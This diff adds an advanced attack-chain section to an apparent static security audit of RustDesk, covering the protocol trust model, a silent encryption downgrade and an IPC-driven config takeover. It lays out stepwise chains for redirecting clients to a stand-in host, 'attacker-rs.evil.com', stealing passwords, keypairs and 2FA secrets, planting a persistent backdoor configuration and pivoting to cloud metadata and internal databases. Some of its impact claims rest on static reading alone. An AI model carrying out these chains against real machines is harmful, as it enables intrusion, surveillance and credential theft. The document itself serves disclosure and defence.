@@ -512,6 +512,490 @@ The target directory (`%LOCALAPPDATA%\rustdesk` on Windows) is user-writable. Be
 
 ---
 
+---
+
+# Part II: Advanced Chained Attack Analysis
+
+## Protocol Architecture — Trust Model Deep Dive
+
+Before presenting attack chains, it is essential to understand the trust architecture of the RustDesk protocol. The system has four actors:
+
+1. **Client** (connecting peer) — initiates connection
+2. **Server** (target peer) — accepts connection, shares screen/input
+3. **Rendezvous Server (RS)** — routes connections, signs peer identity
+4. **Relay Server** — forwards traffic when direct connection fails
+
+### The Rendezvous Server is the Sole Root of Trust
+
+The RS is the **only** entity that vouches for peer identity. The trust chain works as follows:
+
+1. Each RustDesk instance registers with the RS, providing its ID and signing public key
+2. The RS signs the peer's `{ID, PublicKey}` tuple with its own signing key
+3. When Client wants to connect to Server, the RS provides the Server's signed `{ID, PK}` in the `PunchHoleResponse.pk` field (`src/client.rs:506`)
+4. Client verifies this signature against the RS's public key (`src/client.rs:770`)
+5. Client uses the verified PK to authenticate the Server's `SignedId` message (`src/client.rs:794`)
+6. Only then is a symmetric key established (`src/client.rs:796-805`)
+
+**Critical implication**: Whoever controls the RS controls ALL peer identity verification. There is no independent certificate authority, no certificate pinning to the peer, and no out-of-band verification.
+
+### Key Exchange Protocol Flow (Detailed)
+
+```
+CLIENT                        RS                          SERVER
+  |---[PunchHoleRequest]----->|                              |
+  |                           |---[PunchHole]--------------->|
+  |                           |<--[PunchHoleResponse]--------|
+  |<--[PunchHoleResponse]----|                               |
+  |    (contains signed_id_pk = RS_sign(Server_ID + Server_PK))
+  |                                                          |
+  |================== Direct/Relay TCP =====================>|
+  |                                                          |
+  |<-----------[SignedId: Server_sign(Server_ID + EphPK)]---|
+  |   (client verifies using Server_PK from step above)      |
+  |                                                          |
+  |---[PublicKey: EphPK_client + box_seal(symkey)]---------->|
+  |   (server decrypts symkey using EphSK)                   |
+  |                                                          |
+  |<============= Encrypted with symkey ===================>|
+  |                                                          |
+  |<-----------[Hash: {salt, challenge}]--------------------|
+  |---[LoginRequest: {password_hash, my_id, ...}]---------->|
+  |<-----------[LoginResponse / Error]----------------------|
+```
+
+---
+
+## FINDING 13 (CRITICAL): Protocol Downgrade — Encryption Silently Disabled on PK Mismatch
+
+**File:** `src/client.rs:810-816` (client), `src/server.rs:227-229` (server)
+**Impact:** Active network attacker can force ALL connections to be completely unencrypted
+**Type:** CWE-757 (Selection of Less-Secure Algorithm During Negotiation)
+
+### The Client Side
+
+When the Server's `SignedId` fails signature verification, the client **silently falls back to unencrypted** instead of aborting:
+
+```rust
+// src/client.rs:810-816
+} else {
+    // fall back to non-secure connection in case pk mismatch
+    log::info!("pk mismatch, fall back to non-secure");
+    let mut msg_out = Message::new();
+    msg_out.set_public_key(PublicKey::new());  // EMPTY PublicKey
+    conn.send(&msg_out).await?;
+}
+```
+
+Additionally, when `signed_id_pk` is empty (RS didn't provide peer identity), the client skips encryption entirely:
+
+```rust
+// src/client.rs:781-787
+let sign_pk = match sign_pk {
+    Some(v) => v,
+    None => {
+        // send an empty message out
+        conn.send(&Message::new()).await?;
+        return Ok(option_pk);  // Returns OK — no error!
+    }
+};
+```
+
+### The Server Side
+
+When the server receives an empty `PublicKey` from the client:
+
+```rust
+// src/server.rs:227-229
+} else if pk.asymmetric_value.is_empty() {
+    Config::set_key_confirmed(false);
+    log::info!("Force to update pk");
+}
+// Connection proceeds WITHOUT encryption
+```
+
+The server not only continues without encryption but also **invalidates its key confirmation**, forcing a key re-registration — which could cause further issues.
+
+### Attack Execution
+
+1. Attacker positions as network MITM (ARP spoof, rogue WiFi, BGP hijack, etc.)
+2. When Client connects to RS, attacker modifies the `PunchHoleResponse` to strip the `pk` field (set to empty)
+3. Client's `secure_connection()` enters the `sign_pk == None` branch → no encryption
+4. Client sends an empty `Message` instead of a `PublicKey`
+5. Server receives the empty message, has no `PublicKey` union → no encryption set
+6. **Both sides silently proceed with plaintext communication**
+7. Attacker reads all screen data, keystrokes, file transfers, and clipboard in real-time
+8. Attacker can inject messages into the stream (input events, file data, etc.)
+
+### Why This Is Critical
+
+- Neither side warns the user that encryption was downgraded
+- The connection appears to work normally from both perspectives
+- There is no "secure connection indicator" the user can check
+- The log message "pk mismatch, fall back to non-secure" goes to the log file, not the UI
+
+---
+
+## FINDING 14 (CRITICAL): SyncConfig via IPC — Complete Configuration Replacement
+
+**File:** `src/ipc.rs:709-714`
+**Impact:** Any local user can replace the ENTIRE service configuration in a single operation
+**Type:** CWE-732 + CWE-862 (Missing Authorization)
+
+### Description
+
+The IPC handler processes `Data::SyncConfig` which replaces ALL configuration atomically:
+
+```rust
+// src/ipc.rs:709-714
+Data::SyncConfig(Some(configs)) => {
+    let (config, config2) = *configs;
+    let _chk = CheckIfRestart::new();
+    Config::set(config);      // Replaces ENTIRE Config
+    Config2::set(config2);    // Replaces ENTIRE Config2
+}
+```
+
+This is not individual option setting — this replaces the entire serialized Config struct, which includes:
+- `rendezvous-server` (which RS to connect to)
+- `key-pair` (the device's signing keypair!)
+- `key-confirmed` (whether the RS has the correct PK)
+- `salt` (used in password hashing)
+- `permanent-password`
+- ALL options (2FA, access mode, permissions, etc.)
+
+### Attack Impact
+
+An attacker can replace the device's keypair with one they control. Since the keypair is used to sign the `SignedId` message during peer-to-peer key exchange, this means:
+1. The attacker generates a new keypair
+2. Sets it via `Data::SyncConfig`
+3. The server now signs `SignedId` with the attacker's private key
+4. The attacker can predict/derive the symmetric session key
+5. Even "encrypted" connections are now attacker-readable
+
+---
+
+## COMPLETE ATTACK CHAIN A: Local Shell → Full MITM of All Remote Connections
+
+**Entry Point:** Any unprivileged local shell access
+**End Result:** Persistent MITM of ALL remote desktop connections to/from the target device
+**Affected:** Every user who connects to or from this machine
+
+### Step-by-Step
+
+```
+Phase 1: IPC Access (0 seconds)
+├─ Connect to /tmp/rustdesk_ipc or equivalent
+├─ Socket permissions are 0o0777 — no restrictions
+└─ No authentication on IPC channel
+
+Phase 2: Configuration Poisoning (< 1 second)
+├─ Send: Data::SyncConfig(Some((modified_config, config2)))
+│   Where modified_config contains:
+│   ├─ custom-rendezvous-server = "attacker-rs.evil.com:21116"
+│   ├─ key = base64(attacker_rs_public_key)
+│   ├─ key-pair = (attacker_signing_sk, attacker_signing_pk)
+│   ├─ key-confirmed = true
+│   └─ All other settings preserved from original
+└─ Config is written to disk immediately — survives reboots
+
+Phase 3: Service Restart (< 5 seconds)
+├─ Send: Data::Close via IPC
+├─ Service stops (if systemd: auto-restarts)
+└─ Service reconnects to attacker's RS
+
+Phase 4: Attacker's Rendezvous Server (persistent)
+├─ Receives RegisterPeer from target device
+├─ Now controls connection routing for this device ID
+├─ For each incoming PunchHoleRequest:
+│   ├─ Signs attacker-controlled {ID, PK} with attacker's RS key
+│   ├─ Client verifies signature → PASSES (using configured RS key)
+│   └─ Routes connection through attacker's relay
+└─ Full MITM established
+
+Phase 5: Interception Capabilities (ongoing)
+├─ See all screen content in real-time (video frames)
+├─ See all keyboard input (including passwords)
+├─ See all mouse movements
+├─ See all file transfers (both directions)
+├─ See all clipboard operations
+├─ Inject keyboard/mouse input
+├─ Modify file transfers in transit
+└─ Impersonate either peer to the other
+```
+
+### Evidence Trail
+
+| Code Location | Evidence |
+|---|---|
+| `src/ipc.rs:442-443` | Socket permissions `0o0777` |
+| `src/ipc.rs:433` | `SecurityAttributes::allow_everyone_create()` |
+| `src/ipc.rs:709-714` | `Config::set(config)` — full config replacement |
+| `src/ipc.rs:538-574` | `Data::Close` — service termination |
+| `src/client.rs:424-428` | `secure_tcp` uses configured `key` to verify RS |
+| `src/client.rs:770` | `decode_id_pk(&signed_id_pk, &rs_pk)` — uses RS PK from config |
+| `src/server.rs:194` | `Config::get_key_pair()` — uses keypair from config |
+| `src/server.rs:201-212` | Server signs with configured keypair |
+
+---
+
+## COMPLETE ATTACK CHAIN B: Local Shell → Steal Credentials → Bypass All Auth → Remote Shell
+
+**Entry Point:** Any unprivileged local shell access
+**End Result:** Full remote access from anywhere on the internet, bypassing password + 2FA
+**Affected:** The target machine, all its data, internal network
+
+### Step-by-Step
+
+```
+Phase 1: Credential Extraction via IPC (< 1 second)
+├─ Send: Data::Config { name: "permanent-password", value: None }
+│   → Receive: permanent password in cleartext
+├─ Send: Data::Config { name: "salt", value: None }
+│   → Receive: password salt
+├─ Send: Data::Config { name: "id", value: None }
+│   → Receive: device ID (e.g., "123 456 789")
+├─ Send: Data::Options(None)
+│   → Receive: all options including "2fa" config
+└─ Send: Data::ConfirmedKey(None)
+    → Receive: key pair (signing keys)
+
+Phase 2: 2FA Bypass (< 1 second)
+├─ Extract encrypted TOTP secret from "2fa" option value
+├─ Decrypt using hardcoded key "00":
+│   decrypt_vec_or_original(&secret, "00")  [src/auth_2fa.rs:66]
+├─ Reconstruct TOTP generator:
+│   TOTP(SHA1, digits=6, period=30, secret)
+└─ Generate valid 2FA code at any time
+
+Phase 3: Remote Connection (from anywhere)
+├─ Install RustDesk client on attacker machine
+├─ Connect to device ID obtained in Phase 1
+├─ Provide stolen permanent password
+├─ Provide generated 2FA code
+└─ Full authenticated session established
+
+Phase 4: Exploitation
+├─ Full screen access (see everything user sees)
+├─ Keyboard/mouse control (act as the user)
+├─ Terminal access (if enabled — full shell)
+├─ File transfer (exfiltrate any file)
+├─ Port forwarding → internal network pivoting:
+│   ├─ 169.254.169.254:80 → cloud metadata/credentials
+│   ├─ 10.0.0.x:5432 → PostgreSQL databases
+│   ├─ 10.0.0.x:6379 → Redis caches
+│   └─ 10.0.0.x:22 → SSH to other machines
+└─ Clipboard interception (capture copied passwords, tokens)
+```
+
+### Self-Healing Property
+
+Even if the user changes their password:
+1. Attacker still has IPC access (socket permissions are code-level, not user-configurable)
+2. Attacker reads the new password via IPC
+3. New 2FA code generated from the same TOTP secret
+4. Access is immediately re-established
+
+The only remediation is modifying the source code to fix the IPC permissions.
+
+---
+
+## COMPLETE ATTACK CHAIN C: Network Attacker → Protocol Downgrade → Plaintext Interception
+
+**Entry Point:** Network adjacency (same WiFi, ISP-level, BGP, etc.)
+**End Result:** All remote desktop traffic in plaintext
+**Affected:** Any connection traversing the attacker's network segment
+
+### Step-by-Step
+
+```
+Phase 1: Position as MITM
+├─ ARP spoofing (local network)
+├─ Rogue WiFi access point
+├─ DNS poisoning
+├─ BGP hijacking (ISP/nation-state level)
+└─ Compromised router/switch
+
+Phase 2: Intercept Client→RS Connection
+├─ Client connects to RS via TCP
+├─ If key/token are empty: secure_tcp() is NOT called
+│   [src/client.rs:424-428]
+├─ Even if secure_tcp IS called: attacker can block it
+│   and let the connection fall through
+└─ Client sends PunchHoleRequest
+
+Phase 3: Modify PunchHoleResponse
+├─ Intercept RS's PunchHoleResponse
+├─ Strip the 'pk' field (set to empty bytes)
+├─ Forward modified response to client
+└─ Client receives response with empty signed_id_pk
+
+Phase 4: Client-Side Downgrade
+├─ secure_connection() called with empty signed_id_pk
+├─ sign_pk = None (no RS signature to verify)
+├─ Code path: src/client.rs:782-787
+│   → sends empty Message
+│   → returns Ok(None) — NO ERROR
+└─ Connection has NO encryption key set
+
+Phase 5: Server-Side Downgrade
+├─ Server's create_tcp_connection() [src/server.rs:195]
+│   sends SignedId with signed ephemeral key
+├─ Client doesn't respond with PublicKey (sent empty Message earlier)
+│   OR client responds with empty PublicKey
+├─ Server: src/server.rs:227-229
+│   → pk.asymmetric_value.is_empty()
+│   → Config::set_key_confirmed(false)
+│   → continues without encryption
+└─ Session proceeds in PLAINTEXT
+
+Phase 6: Traffic Interception
+├─ Hash challenge/response visible in plaintext
+│   → Attacker captures SHA256(SHA256(password+salt)+challenge)
+│   → Can perform offline dictionary attack against password
+├─ All screen frames visible (video codec data)
+├─ All keyboard input visible (including typed passwords)
+├─ All file transfers visible
+├─ All clipboard data visible
+└─ Can inject arbitrary protocol messages
+```
+
+### Why This Works
+
+The protocol has **no mandatory encryption**. Encryption is "best effort":
+- If the RS provides peer PK → encrypted
+- If the RS doesn't provide PK → unencrypted, silently
+- If PK verification fails → unencrypted, silently
+- No user notification either way
+
+---
+
+## COMPLETE ATTACK CHAIN D: Persistent Config Backdoor — Survives Everything
+
+**Entry Point:** One-time local shell access (any user)
+**End Result:** Permanent invisible backdoor that survives password changes, 2FA changes, and reboots
+**Affected:** Target machine permanently compromised
+
+### Step-by-Step
+
+```
+Phase 1: Deploy Backdoor Configuration (one-time, < 2 seconds)
+Via IPC send Data::Options(Some({...})):
+├─ "permanent-password" → set to attacker-known value
+├─ "access-mode" → "full" (all permissions enabled)
+├─ "2fa" → "" (disable 2FA)
+├─ "approve-mode" → "password" (no click-to-approve needed)
+├─ "enable-file-transfer" → "Y"
+├─ "enable-tunnel" → "Y"  (port forwarding)
+├─ "enable-terminal" → "Y" (remote shell)
+├─ "allow-auto-record-incoming" → "N" (disable session recording)
+├─ "enable-lan-discovery" → "N" (reduce visibility)
+└─ "stop-service" → "" (ensure service stays running)
+
+Phase 2: Disable Security Notifications
+├─ "enable-audio" → "N" (no audio alerts)
+├─ Clear trusted devices: Data::ClearTrustedDevices
+└─ All changes written to config file immediately
+
+Phase 3: Access From Anywhere (ongoing)
+├─ Connect to device ID with known password
+├─ No 2FA required (disabled)
+├─ No click-to-approve required (password mode only)
+├─ Full permissions: screen, keyboard, files, terminal, tunnel
+└─ No session recording
+
+Phase 4: Self-Healing After User Password Change
+├─ User changes password through RustDesk GUI
+├─ New password is written to config
+├─ Attacker reads new password via IPC (still world-accessible)
+│   Data::Config { name: "permanent-password", value: None }
+└─ Attacker updates their stored password — access continues
+
+Phase 5: Self-Healing After 2FA Enable
+├─ User enables 2FA through RustDesk GUI
+├─ 2FA secret written to config with hardcoded key "00"
+├─ Attacker reads via IPC: Data::Options(None) → "2fa" value
+├─ Decrypt with "00", generate TOTP codes
+└─ 2FA defeated — access continues
+
+Phase 6: Self-Healing After Service Reinstall
+├─ IPC permissions are hardcoded in source (0o0777)
+├─ Reinstalling RustDesk recreates the same vulnerable socket
+└─ Attacker repeats Phase 1 — access continues
+```
+
+### The Only Effective Remediation
+
+The IPC socket permissions must be changed in the source code. No amount of user-level configuration, password rotation, or 2FA enablement can defend against this because the attacker retains the ability to read all credentials and modify all settings through the world-accessible IPC socket.
+
+---
+
+## COMPLETE ATTACK CHAIN E: Cross-Privilege Escalation via SwitchSides + Relay Manipulation
+
+**Entry Point:** Authenticated remote session (via Chain B)
+**End Result:** Control of the connecting user's machine (privilege escalation across hosts)
+**Affected:** Any administrator who connects to the compromised machine
+
+### Concept
+
+RustDesk's "Switch Sides" feature allows the controlled machine to reverse roles and control the controller. This is triggered via IPC:
+
+```rust
+// src/ipc.rs:738-745
+Data::SwitchSidesRequest(id) => {
+    let uuid = uuid::Uuid::new_v4();
+    crate::server::insert_switch_sides_uuid(id, uuid.clone());
+```
+
+### Attack Scenario
+
+1. IT administrator connects to a compromised machine for maintenance
+2. Attacker (who has IPC access on compromised machine) sends `Data::SwitchSidesRequest`
+3. The compromised machine initiates a reverse connection to the admin's machine
+4. If the admin's machine auto-accepts (e.g., the session is already trusted), attacker gains control
+5. Now the attacker has desktop access to the administrator's machine
+6. From the admin's machine: domain controller access, credential harvesting, network-wide compromise
+
+---
+
+## Impact Assessment: Cascading Failure Model
+
+```
+Local Shell Access (any user)
+         │
+         ▼
+    IPC Socket (0o0777)
+    ┌────┴─────────────────────────────────────────────┐
+    │                                                   │
+    ▼                                                   ▼
+Read Credentials                              Modify Configuration
+├─ Permanent Password                         ├─ Redirect to Rogue RS
+├─ Temporary Password                         ├─ Replace Signing Keypair
+├─ Salt                                       ├─ Disable 2FA
+├─ Signing Keypair                            ├─ Disable Approve Mode
+├─ 2FA Secret (hardcoded key)                 ├─ Enable All Permissions
+└─ Device ID                                  ├─ Enable Insecure TLS
+         │                                    └─ Set Known Password
+         ▼                                             │
+    Remote Access                                      ▼
+    (from anywhere)                             MITM All Connections
+    ├─ Full Desktop Control                     ├─ See All Screens
+    ├─ Terminal/Shell                            ├─ Capture All Keystrokes
+    ├─ File Exfiltration                        ├─ Intercept File Transfers
+    ├─ Clipboard Capture                        └─ Impersonate Any Peer
+    └─ Port Forwarding (SSRF)                          │
+         │                                             ▼
+         ▼                                    Compromise ALL Users
+    Internal Network                           Connected To This Device
+    ├─ Cloud Metadata
+    ├─ Databases
+    ├─ Internal Services
+    └─ Lateral Movement
+```
+
+This represents a **complete cascading failure** where a single design decision (world-accessible IPC socket) combined with protocol-level weaknesses (no mandatory encryption, hardcoded crypto keys, signature bypass) enables an unprivileged local user to escalate to full control of the target machine, all connected users, and the internal network.
+
+---
+
 ## Methodology
 
 This audit was conducted through static code analysis of the RustDesk source code. The review focused on:
@@ -524,9 +1008,13 @@ This audit was conducted through static code analysis of the RustDesk source cod
 - Command execution and shell interaction
 - Plugin/extension mechanisms
 - Configuration handling and input validation
+- **End-to-end protocol analysis**: Complete tracing of the connection lifecycle from rendezvous to key exchange to authentication to session establishment
+- **Trust model analysis**: Identification of all trust roots and trust boundaries
+- **Attack chain composition**: Building multi-step attacks that chain individual weaknesses
 
 ## Scope Notes
 
 - The `libs/hbb_common` submodule was not initialized, limiting review of the common library. The `password_security`, `config`, and `fs` modules referenced throughout the code could contain additional issues.
 - Flutter/Dart UI code was not reviewed in depth (focus was on the Rust backend).
 - This is a static analysis only; no dynamic testing or fuzzing was performed.
+- The `AddrMangle` encoding/decoding in `hbb_common` was not auditable (submodule not available), but if address encoding is predictable, additional attacks on connection routing may be possible.
